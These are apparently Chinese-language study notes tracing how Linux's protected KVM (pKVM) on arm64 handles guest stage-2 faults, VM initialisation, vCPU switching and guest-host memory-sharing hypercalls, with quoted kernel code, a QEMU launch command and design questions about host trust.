<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">kvm_handle_guest_abort&#123;</span><br><span class="line">    gfn = fault_ipa &gt;&gt; PAGE_SHIFT;</span><br><span class="line">    memslot = gfn_to_memslot(vcpu-&gt;kvm, gfn);</span><br><span class="line">    hva = gfn_to_hva_memslot_prot(memslot,gfn);</span><br><span class="line">    </span><br><span class="line">    if (is_protected_kvm_enabled())</span><br><span class="line">        pkvm_mem_abort</span><br><span class="line">            -&gt; pin_user_pages(hva, &amp;page);</span><br><span class="line">               pfn = page_to_pfn(page);</span><br><span class="line">               pkvm_host_map_guest</span><br><span class="line">                -&gt;kvm_call_hyp_nvhe(__pkvm_host_map_guest)</span><br><span class="line">                    -&gt;__pkvm_host_donate_guest&#123;</span><br><span class="line">                        initiator.id = PKVM_ID_HOST;</span><br><span class="line">                        initiator.addr = host_addr;</span><br><span class="line">                        initiator.host.completer_addr = guest_addr;</span><br><span class="line">                        completer.id = PKVM_ID_GUEST;</span><br><span class="line">                        completer.guest.phys = host_addr;</span><br><span class="line">                        -&gt;do_donate&#123;</span><br><span class="line">                            host_initiate_donation;</span><br><span class="line">                                -&gt;host_stage2_set_owner_locked</span><br><span class="line">                                    -&gt;kvm_pgtable_stage2_annotate(&amp;host_mmu.gpt)</span><br><span class="line">                                        -&gt;kvm_pgtable_walk(pgt, stage2_map_walk);//phys=KVM_PHYS_INVALID</span><br><span class="line">                            guest_complete_donation;</span><br><span class="line">                                -&gt;kvm_pgtable_stage2_map(&amp;vm-&gt;gpt,guest_addr,host_addr);</span><br><span class="line">                                    -&gt;kvm_pgtable_walk(pgt, stage2_map_walk);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">               </span><br><span class="line">    else</span><br><span class="line">        user_mem_abort</span><br><span class="line">            -&gt;kvm_pgtable_stage2_map</span><br><span class="line">                -&gt;kvm_pgtable_walk(vcpu-&gt;arch.hw_mmu-&gt;pgt,stage2_map_walker)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到guest stage2的pf EL1会调用EL2的__pkvm_host_map_guest 这里先解开host stage2映射 然后加上guest stage2映射</p>
<p>这非pkvm的情况下 直接在EL1调用kvm_pgtable_stage2_map调整好页表</p>
<p>观察调用路径可以发现，这里handler完全是在EL1处理的 run完马上退到EL1 pkvm_mem_abort-&gt;kvm_call_hyp_nvhe(__pkvm_host_map_guest)再到EL2 这么做是否相信了EL1的hypervisor？ 可以选择在guest page fault的时候不unmap host？</p>
<p>先在EL1 pin_user_page 拿到gpa</p>
<p>非pkvm get_user_page 拿到gpa</p>
<p>都是用的EL1接口 在EL1做 不知道区别是什么</p>
<p>如果EL1可以任意准备物理内存页来攻击，EL2做的</p>
<ul>
<li>检查这个内存页之前是否属于host，如果不属于就拒绝</li>
<li>从host stage2中unmap</li>
</ul>
<p>这两步能否保证guest内存的机密性和完整性？</p>
<ul>
<li>当一个内存页给guest以后 这块物理地址host永远不会访问</li>
<li>当guest主动把自己的某个物理页给host share之前 guest可以清空数据</li>
<li>guest不会被两个物理页映射到同一个ipa（host检查）</li>
<li>guest不能相信第一次使用的物理页（page fault由host决定用哪个物理页 但是hyp可以清空这些数据）内存的初始状态？读磁盘？fs-verity依赖一个root hash 是否可以存在可信的EL2代码里？guest读取 拼接 验证 如果错误就是DOS</li>
</ul>
<p>如此分析 hpa给EL1管理没有问题 只要EL2检查通过即可</p>
<h3 id="初始化VM"><a href="#初始化VM" class="headerlink" title="初始化VM"></a>初始化VM</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kvm_vcpu_ioctl <span class="comment">//virt/kvm/kvm_main.c</span></span><br><span class="line">    <span class="function">KVM_RUN </span></span><br><span class="line"><span class="function">        <span class="title">unlikely</span><span class="params">(oldpid != task_pid(current)<span class="comment">//the thread running this vcpu changed</span></span></span></span><br><span class="line"><span class="params"><span class="function">            kvm_arch_vcpu_run_pid_change</span></span></span><br><span class="line"><span class="params"><span class="function">                -&gt;<span class="keyword">if</span> (is_protected_kvm_enabled())</span></span></span><br><span class="line"><span class="params"><span class="function">                     __pkvm_create_hyp_vm</span></span></span><br><span class="line"><span class="params"><span class="function">                        -&gt;kvm_call_hyp_nvhe(__pkvm_init_vm);</span></span></span><br><span class="line"><span class="params"><span class="function">                        __pkvm_init_vm</span></span></span><br><span class="line"><span class="params"><span class="function">                        -&gt;insert_vm_table_entry</span></span></span><br><span class="line"><span class="params"><span class="function">                            -&gt;hyp_vm-&gt;kvm.arch.mmu.pgt = &amp;hyp_vm-&gt;pgt</span></span></span><br><span class="line"><span class="params"><span class="function">                        -&gt;kvm_guest_prepare_stage2</span></span></span><br><span class="line"><span class="params"><span class="function">                            -&gt;__kvm_pgtable_stage2_init</span></span></span><br><span class="line"><span class="params"><span class="function">                                -&gt;pgt-&gt;pgd = zalloc_pages_exact</span></span></span><br></pre></td></tr></table></figure>

<p>不知道为什么这里入口是kvm run</p>
<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/9d0c063a4d1d10ef8e6288899b8524413e40cfa0#diff-53d87d0b516f008da397a4b46f61c48934d55a53cc5c94686aa1d84fd8efaee4R154">KVM: arm64: Instantiate pKVM hypervisor VM and vCPU structures from EL1 · torvalds&#x2F;linux@9d0c063</a></p>
<p>非pkvm：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kvm_dev_ioctl</span><br><span class="line">kvm_dev_ioctl_create_vm</span><br><span class="line">kvm_create_vm <span class="comment">//virt/kvm/kvm_main.c</span></span><br><span class="line">    -&gt;kvm = kvm_arch_alloc_vm</span><br><span class="line">      <span class="built_in">mutex_init</span>(&amp;kvm-&gt;lock);</span><br><span class="line">    kvm_arch_init_vm</span><br><span class="line">          -&gt;<span class="built_in">pkvm_init_host_vm</span>(kvm)&#123;</span><br><span class="line">                <span class="keyword">if</span> (!(type &amp; KVM_VM_TYPE_ARM_PROTECTED))</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">is_protected_kvm_enabled</span>())</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                host_kvm-&gt;arch.pkvm.enabled = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">              </span><br><span class="line">            <span class="built_in">kvm_init_stage2_mmu</span>(kvm-&gt;arch.mmu)&#123;</span><br><span class="line">            pgt = kzalloc</span><br><span class="line">            kvm_pgtable_stage2_init</span><br><span class="line">                -&gt;pgt-&gt;pgd = zalloc_pages_exact</span><br><span class="line">            mmu-&gt;pgt = pgt;</span><br><span class="line">            mmu-&gt;pgd_phys = __pa(pgt-&gt;pgd);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>是否pkvm不希望大改目前的kvm逻辑 因此选择把入口加到了kvm_arch_vcpu_run_pid_change中？</p>
<p>具体需要看crosvm的逻辑 但是不重要 知道怎么初始化就行 可以认为这个项目只跑pvm 不需要兼容vm</p>
<p>host qemu启动指令：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/repos/qemu/build/aarch64-softmmu/qemu-system-aarch64 -M virt        \</span><br><span class="line">      -machine virtualization=<span class="literal">true</span> -machine virt,gic-version=<span class="number">3</span>  \</span><br><span class="line">      -cpu cortex-a72 -smp <span class="number">2</span> -m <span class="number">4096</span>                   \</span><br><span class="line">      -drive <span class="keyword">if</span>=pflash,format=raw,file=efi.img,readonly     \</span><br><span class="line">      -drive <span class="keyword">if</span>=pflash,format=raw,file=varstore.img         \</span><br><span class="line">      -drive <span class="keyword">if</span>=virtio,format=qcow2,file=disk.img           \</span><br><span class="line">      -device virtio-scsi-pci,id=scsi0              \</span><br><span class="line">      -object rng-random,filename=/dev/urandom,id=rng0      \</span><br><span class="line">      -device virtio-rng-pci,rng=rng0               \</span><br><span class="line">      -device virtio-net-pci,netdev=net0                \</span><br><span class="line">      -netdev user,id=net0,hostfwd=tcp::<span class="number">8022</span>-:<span class="number">22</span>            \</span><br><span class="line">      -nographic                           \</span><br><span class="line">      -kernel ~/repos/linux-pkvm-verif/arch/arm64/boot/Image -append <span class="string">&quot;earlycon nokaslr kvm-arm.mode=protected root=/dev/vda2&quot;</span> </span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>guest vmm 看crosvm</p>
<h3 id="切换"><a href="#切换" class="headerlink" title="切换"></a>切换</h3><p>hyp&#x2F;nvhe&#x2F;switch.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__pkvm_create_hyp_vm</span><br><span class="line">    -&gt;__pkvm_init_vcpu</span><br><span class="line">        -&gt;init_pkvm_hyp_vcpu</span><br><span class="line">            -&gt;vcpu.arch.hw_mmu = &amp;hyp_vm-&gt;kvm.arch.mmu; //hyp/nvhe/pkvm.c</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">kvm_vm_ioctl_create_vcpu</span><br><span class="line">    -&gt;kvm_arch_vcpu_create</span><br><span class="line">        -&gt;vcpu-&gt;arch.hw_mmu = &amp;vcpu-&gt;kvm-&gt;arch.mmu; //arm.c        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kvm_arch_vcpu_ioctl_run</span><br><span class="line">-&gt;kvm_arm_vcpu_enter_exit</span><br><span class="line">    -&gt;kvm_call_hyp_ret(__kvm_vcpu_run)</span><br><span class="line">__kvm_vcpu_run&#123;</span><br><span class="line">    __load_stage2(vcpu-&gt;arch.hw_mmu);</span><br><span class="line">    do&#123;</span><br><span class="line">        exit_code = __guest_enter(vcpu);</span><br><span class="line">    &#125;while(fixup_guest_exit(vcpu, &amp;exit_code));</span><br><span class="line">    __load_host_stage2();</span><br><span class="line">        -&gt;__load_stage2(&amp;host_mmu.arch.mmu, &amp;host_mmu.arch)</span><br><span class="line">            -&gt;write_sysreg(kvm_get_vttbr(mmu), vttbr_el2);</span><br><span class="line">                -&gt;kvm_phys_to_vttbr(mmu-&gt;pgd_phys) | mmu-&gt;vmid.id &lt;&lt; SHIFT | cnp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kvm_vm_ioctl_create_vcpu在vcpu_run之前 所以在__pkvm_create_hyp_vm之前</p>
<p>因此为传统vm准备的stage2页表等资源会被pkvm的初始化覆盖，代码执行、资源准备，但是完全没有使用？</p>
<p>开了pkvm的host支持pvm和normal vm</p>
<p>可以看到guest使用的stage2页表完全是由EL2的hyp来操作的 EL1应该是提供了一段内存 EL2会先把这段内存unmap掉 然后用于分配EL2页表</p>
<p>在x86或arm上 EPT&#x2F;stage2pt都是由kvm准备（分配内存并且map） 而并非像hm一样由用户态或sysmgr准备好然后作为参数传入 （uvmm-&gt;sysmgr-&gt;hmvirt） sysmgr是否扮演的是kvm的角色？</p>
<h3 id="hypercall共享内存"><a href="#hypercall共享内存" class="headerlink" title="hypercall共享内存"></a>hypercall共享内存</h3><h4 id="Guest"><a href="#Guest" class="headerlink" title="Guest"></a>Guest</h4><p>pkvm-android-mainline-6.6</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ARM_SMCCC_KVM_FUNC_HYP_MEMINFO</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARM_SMCCC_KVM_FUNC_HYP_MEMINFO        2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARM_SMCCC_VENDOR_HYP_KVM_HYP_MEMINFO_FUNC_ID                        \</span></span><br><span class="line"><span class="meta">        ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,                                \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_SMC_64,                                \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_OWNER_VENDOR_HYP,                        \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_KVM_FUNC_HYP_MEMINFO)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>        <span class="comment">/* ARM_SMCCC_KVM_FUNC_HYP_MEMINFO */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ARM_SMCCC_KVM_FUNC_MEM_SHARE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARM_SMCCC_KVM_FUNC_MEM_SHARE        3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARM_SMCCC_VENDOR_HYP_KVM_MEM_SHARE_FUNC_ID                        \</span></span><br><span class="line"><span class="meta">        ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,                                \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_SMC_64,                                \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_OWNER_VENDOR_HYP,                        \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_KVM_FUNC_MEM_SHARE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>        <span class="comment">/* ARM_SMCCC_KVM_FUNC_MEM_SHARE */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ARM_SMCCC_KVM_FUNC_MEM_UNSHARE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARM_SMCCC_KVM_FUNC_MEM_UNSHARE        4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARM_SMCCC_VENDOR_HYP_KVM_MEM_UNSHARE_FUNC_ID                        \</span></span><br><span class="line"><span class="meta">        ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL,                                \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_SMC_64,                                \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_OWNER_VENDOR_HYP,                        \</span></span><br><span class="line"><span class="meta">                           ARM_SMCCC_KVM_FUNC_MEM_UNSHARE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>        <span class="comment">/* ARM_SMCCC_KVM_FUNC_MEM_UNSHARE */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> memshare_granule_sz;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> memshare_has_range;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">mem_encrypt_active</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> memshare_granule_sz;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">EXPORT_SYMBOL</span>(mem_encrypt_active);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kvm_init_memshare_services</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">arm_smccc_res</span> res;</span><br><span class="line">        <span class="type">const</span> u32 funcs[] = &#123;</span><br><span class="line">                ARM_SMCCC_KVM_FUNC_HYP_MEMINFO,</span><br><span class="line">                ARM_SMCCC_KVM_FUNC_MEM_SHARE,</span><br><span class="line">                ARM_SMCCC_KVM_FUNC_MEM_UNSHARE,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">ARRAY_SIZE</span>(funcs); ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">kvm_arm_hyp_service_available</span>(funcs[i]))</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">arm_smccc_1_1_invoke</span>(ARM_SMCCC_VENDOR_HYP_KVM_HYP_MEMINFO_FUNC_ID,</span><br><span class="line">                             <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;res);</span><br><span class="line">        ret = (<span class="type">long</span>)res.a0;</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        memshare_has_range = !!(res.a1 &amp; KVM_FUNC_HAS_RANGE);</span><br><span class="line">        memshare_granule_sz = ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __invoke_memshare(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">int</span> numpages, <span class="type">int</span> func_id,</span><br><span class="line">                             u64 *done)</span><br><span class="line">&#123;</span><br><span class="line">        u64 size_arg = memshare_has_range ? numpages * PAGE_SIZE : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">arm_smccc_res</span> res;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">arm_smccc_1_1_invoke</span>(func_id, <span class="built_in">virt_to_phys</span>((<span class="type">void</span> *)addr),</span><br><span class="line">                             size_arg, <span class="number">0</span>, &amp;res);</span><br><span class="line">        <span class="keyword">if</span> (res.a0 != SMCCC_RET_SUCCESS)</span><br><span class="line">                <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">        *done = memshare_has_range ? res.a1 : memshare_granule_sz;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">set_memory_xcrypted</span><span class="params">(u32 func_id, <span class="type">unsigned</span> <span class="type">long</span> start, <span class="type">int</span> numpages)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!memshare_granule_sz)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">WARN_ON</span>(!<span class="built_in">PAGE_ALIGNED</span>(start)))</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((PAGE_SIZE * numpages) % memshare_granule_sz)</span><br><span class="line">                <span class="keyword">return</span> -ERANGE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (numpages &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                u64 done;</span><br><span class="line">                <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">                ret = __invoke_memshare(start, numpages, func_id, &amp;done);</span><br><span class="line">                <span class="keyword">if</span> (ret)</span><br><span class="line">                        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">WARN_ON</span>(done &gt;&gt; PAGE_SHIFT &gt; numpages);</span><br><span class="line"></span><br><span class="line">                numpages -= done &gt;&gt; PAGE_SHIFT;</span><br><span class="line">                start += done;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">set_memory_encrypted</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">int</span> numpages)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set_memory_xcrypted</span>(ARM_SMCCC_VENDOR_HYP_KVM_MEM_UNSHARE_FUNC_ID,</span><br><span class="line">                                   addr, numpages);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">set_memory_decrypted</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">int</span> numpages)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set_memory_xcrypted</span>(ARM_SMCCC_VENDOR_HYP_KVM_MEM_SHARE_FUNC_ID,</span><br><span class="line">                                   addr, numpages);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">kvm_handle_pvm_hvc64</span><br><span class="line">pkvm_memshare_call</span><br><span class="line">__pkvm_guest_share_host</span><br><span class="line">do_share</span><br><span class="line">__do_share</span><br><span class="line">static const exit_handler_fn pvm_exit_handlers[] = &#123;</span><br><span class="line">    [0 ... ESR_ELx_EC_MAX]      = NULL,</span><br><span class="line">    [ESR_ELx_EC_HVC64]      = kvm_handle_pvm_hvc64,</span><br><span class="line">    [ESR_ELx_EC_SYS64]      = kvm_handle_pvm_sys64,</span><br><span class="line">    [ESR_ELx_EC_SVE]        = kvm_handle_pvm_restricted,</span><br><span class="line">    [ESR_ELx_EC_SME]        = kvm_handle_pvm_restricted,</span><br><span class="line">    [ESR_ELx_EC_FP_ASIMD]       = kvm_hyp_handle_fpsimd,</span><br><span class="line">    [ESR_ELx_EC_IABT_LOW]       = kvm_hyp_handle_iabt_low,</span><br><span class="line">    [ESR_ELx_EC_DABT_LOW]       = kvm_hyp_handle_dabt_low,</span><br><span class="line">    [ESR_ELx_EC_WATCHPT_LOW]    = kvm_hyp_handle_watchpt_low,</span><br><span class="line">    [ESR_ELx_EC_MOPS]       = kvm_hyp_handle_mops,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#define ARM_SMCCC_KVM_FUNC_MEM_SHARE        3</span><br><span class="line">#define ARM_SMCCC_KVM_FUNC_MEM_UNSHARE      4</span><br><span class="line"></span><br><span class="line">#define ARM_SMCCC_CALL_VAL(type, calling_convention, owner, func_num) \</span><br><span class="line">    (((type) &lt;&lt; ARM_SMCCC_TYPE_SHIFT) | \</span><br><span class="line">    ((calling_convention) &lt;&lt; ARM_SMCCC_CALL_CONV_SHIFT) | \</span><br><span class="line">    (((owner) &amp; ARM_SMCCC_OWNER_MASK) &lt;&lt; ARM_SMCCC_OWNER_SHIFT) | \</span><br><span class="line">    ((func_num) &amp; ARM_SMCCC_FUNC_MASK))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define 